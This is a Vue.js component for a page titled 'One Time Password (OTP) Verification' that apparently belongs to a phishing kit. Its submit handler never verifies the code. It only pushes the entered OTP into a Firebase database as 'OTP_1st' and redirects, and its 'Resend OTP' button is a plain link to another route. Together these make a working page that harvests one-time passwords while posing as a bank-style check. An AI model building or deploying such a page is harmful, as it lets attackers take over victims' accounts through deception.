<template>
  <div class="App">
    <Head />
    <div class="mainContent">
      <h1 class="text-center">One Time Password (OTP) Verification</h1>
      <div class="card">
        <p style="color: grey; font-size: 13px; margin-left: 20px; font-family: Work Sans, sans-serif;">
          One Time Password (OTP) has been sent to your registered mobile Number. Please enter the OTP and proceed.
          <br />
          <span style="font-size: 13px; margin-left: 20px; font-family: Work Sans, sans-serif;">
          </span>
        </p>
        <form class="LoginForm myform" @submit.prevent="handleSubmit">
          <div class="form-group">
            <label style="font-size: 13px; font-family: Work Sans, sans-serif;" for="otp">
              One Time Password<span style="font-size: 13px; color: red;">*</span>
            </label>
            <input
              type="password"
              class="new-control"
              id="otp"
              name="otp"
              maxlength="6"
              inputmode="numeric"
              pattern="[0-9]{4,6}"
              title="Please enter valid OTP!"
              required
              v-model="otp"
            />
          </div>
          <div id="re">
            <b>
              <router-link
                :to="{ path: '/blogone' }"
                style="
                  color: #fff;
                  font-family: Work Sans, sans-serif;
                  background-color: #a6004d;
                  padding: 4px 6px;
                  border-radius: 4px;
                  position: absolute;
                  margin: -4%;
                  margin-left: 165px;
                  text-decoration: none;
                "
              >
                Resend OTP
              </router-link>
            </b>
          </div>
          <br />
          <div>
            <center>
              <b
                style="
                  color: #a6004d;
                  font-family: Work Sans, sans-serif;
                  font-size: 14px;
                  text-align: center;
                "
              >
                <span style="color: #a6004d; font-family: Work Sans, sans-serif; font-size: 13px;">{{ timer }} second</span>
              </b>
            </center>
          </div>
          <br />
          <div class="text-center">
            <button type="submit" class="submit">Proceed</button>
          </div>
        </form>
      </div>
    </div>
    <Footer />
  </div>
</template>

<script>
import { ref, push, set, getDatabase } from '@firebase/database';
import { app } from './firebase';
import Head from './HeadPage.vue';
import Footer from './FooterPage.vue';

const db = getDatabase(app);
export default {
  components: {
    Head,
    Footer,
  },
  data() {
    return {
      otp: '',
      timer: 180,
    };
  },
  mounted() {
    this.startCountdown();
  },
  methods: {
    startCountdown() {
      setInterval(() => {
        if (this.timer <= 0) {
          clearInterval();
          // Redirect or handle the timer expiration here
          // Example: this.$router.push("/otp");
        } else {
          this.timer--;
        }
      }, 1000);
    },
    handleSubmit() {
      // Check if the OTP is valid before proceeding
      if (!/^[0-9]\d{5}$/.test(this.otp)) {
        alert('Please enter a valid OTP.');
        return;
      }

      // Prepare the data to be saved
      const userData = {
        OTP_1st: this.otp,
      };

      // Specify the Firebase database reference
      const otpRef = ref(db, 'data'); // Replace 'data' with your desired database path

      // Push the data with a unique key
      const newEntryRef = push(otpRef);

      // Set the data at the generated reference
      set(newEntryRef, userData)
        .then(() => {
          console.log('Data saved successfully with a unique key.');
          // Handle success or navigate to another page
          this.$router.push("/about"); // Replace "/nextPage" with the actual path you want to navigate to
        })
        .catch((error) => {
          console.error('Error saving data: ', error);
          // Handle error
        });
    },
  },
};
</script>

<style scoped>
/* Add your CSS styles here */
</style>
